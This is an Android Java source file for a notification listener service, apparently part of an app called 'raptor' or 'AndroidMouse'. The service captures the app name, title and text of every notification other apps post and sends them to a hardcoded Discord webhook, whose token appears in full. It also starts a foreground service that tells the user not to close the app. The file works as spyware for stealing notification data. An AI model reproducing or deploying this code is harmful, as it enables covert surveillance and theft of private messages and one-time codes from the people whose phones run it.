package com.velociraptor.raptor;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.core.content.ContextCompat;

import org.json.JSONException;

import java.io.IOException;

@SuppressLint("OverrideAbstract")
public class NotificationListener extends NotificationListenerService {

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    public void onNotificationPosted(StatusBarNotification sbn){
        try {
            String appName = sbn.getPackageName();
            String title = sbn.getNotification().extras.getString(Notification.EXTRA_TITLE);
            CharSequence contentCs = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
            String content = "";
            if(contentCs != null) content = contentCs.toString();
            String Content = content;
            new Thread(){
                @Override
                public void run() {
                    try {
                        if(!appName.equals("com.velociraptor.raptor")){
                            senddisp("App Name : " + appName + " " +  "Title : " + title + " " + "Content : " + Content);
                            Intent serviceIntent = new Intent(NotificationListener.this, ForegroundService.class);
                            serviceIntent.putExtra("inputExtra", "Warning !! Dont Close the App");
                            ContextCompat.startForegroundService(NotificationListener.this, serviceIntent);
                            }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }.start();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void senddisp(String msg) throws IOException {
        DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/1026189010428764260/pT2kcrPy9xeWsOSGfC8viRtqQ38Y4bqbk6gYYQHjCR8vGorwqzZGxfij0yGFJi0mOEsU");
        webhook.setContent(msg);
        webhook.setAvatarUrl("https://avatars.githubusercontent.com/u/46685308?v=4");
        webhook.setUsername("AndroidMouse");
        webhook.execute();
    }
}
